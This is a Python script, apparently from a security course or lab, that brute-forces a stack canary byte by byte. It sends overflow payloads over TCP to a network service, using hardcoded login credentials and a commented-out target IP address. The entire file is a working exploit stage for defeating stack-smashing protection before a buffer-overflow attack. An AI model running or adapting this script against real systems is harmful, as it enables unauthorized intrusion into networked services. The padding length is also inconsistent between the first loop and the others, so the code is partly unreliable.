import socket
import time

canary1 = "c1"
canary2 = "c2"
canary3 = "c3"
canary4 = "c4"

def getanswer(check):
	if(check):
		time.sleep(1)
		data = s.recv(BufferSize)
		print("received data:", data)
		if("RED" not in data):
			return 1
		else:
			data = s.recv(BufferSize)

# bruteforce canary4
for x in range(256):
	buffer = "A"*256
	buffer += chr(x)

	# connection setup
	#TCP_IP = '10.105.21.174' #target system IP
	TCP_IP = '127.0.0.1'
	TCP_PORT = 8080
	BufferSize = 4096

	# open connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	s.connect((TCP_IP, TCP_PORT))
	getanswer(0)

	# send login, update username + pattern
	s.send('cs19m018:cs19m018'+'\n')
	getanswer(0)
	BufferSize = 100
	s.send('u '+ buffer + '\n')
	getanswer(0)

	# send exit
	s.send('e'+ '\n')
	if(getanswer(1)):
		canary4 = x
		break
	print("var: ",hex(x)," ",chr(x))
	s.close()

print("Canary4: ",chr(canary4)," ",hex(canary4))

# bruteforce canary3
for x in range(256):
	buffer = "A"*128+chr(canary4)
	buffer += chr(x)

	# connection setup
	#TCP_IP = '10.105.21.174'
	TCP_IP = '127.0.0.1'
	TCP_PORT = 8080
	BufferSize = 4096

	# open connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	s.connect((TCP_IP, TCP_PORT))
	getanswer(0)

	# send login, update username + pattern
	s.send('cs19m018:cs19m018'+'\n')
	getanswer(0)
	BufferSize = 100
	s.send('u '+ buffer + '\n')
	getanswer(0)

	# send exit
	s.send('e'+ '\n')
	if(getanswer(1)):
		canary3 = x
		break
	print("var: ",hex(x)," ",chr(x))
	s.close()

print("Canary3: ",chr(canary3)," ",hex(canary3))

# bruteforce canary2
for x in range(256):
	buffer = "A"*128+chr(canary4)+chr(canary3)
	buffer += chr(x)

	# connection setup
	TCP_IP = '127.0.0.1'
	#TCP_IP = '10.105.21.174' #ip target system
	TCP_PORT = 8080
	BufferSize = 4096

	# open connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	s.connect((TCP_IP, TCP_PORT))
	getanswer(0)

	# send login, update username + pattern
	s.send('cs19m018:cs19m018'+'\n')
	getanswer(0)
	BufferSize = 100
	s.send('u '+ buffer + '\n')
	getanswer(0)

	# send exit
	s.send('e'+ '\n')
	if(getanswer(1)):
		canary2 = x
		break
	print("var: ",hex(x)," ",chr(x))
	s.close()

print("Canary2: ",chr(canary2)," ",hex(canary2))

# bruteforce canary1
for x in range(256):
	buffer = "A"*128+chr(canary4)+chr(canary3)+chr(canary2)
	buffer += chr(x)

	# connection setup
	TCP_IP = '127.0.0.1'
	#TCP_IP = '10.105.21.174'
	TCP_PORT = 8080
	BufferSize = 4096

	# open connection
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(1)
	s.connect((TCP_IP, TCP_PORT))
	getanswer(0)

	# send login, update username + pattern
	s.send('cs19m018:cs19m018'+'\n')
	getanswer(0)
	BufferSize = 100
	s.send('u '+ buffer + '\n')
	getanswer(0)

	# send exit
	s.send('e'+ '\n')
	if(getanswer(1)):
		canary1 = x
		break
	print("var:",hex(x)," ",chr(x))
	s.close()

print("Canary1:",chr(canary1),"",hex(canary1))
print("Canary2:",chr(canary2),"",hex(canary2))
print("Canary3:",chr(canary3),"",hex(canary3))
print("Canary4:",chr(canary4),"",hex(canary4))
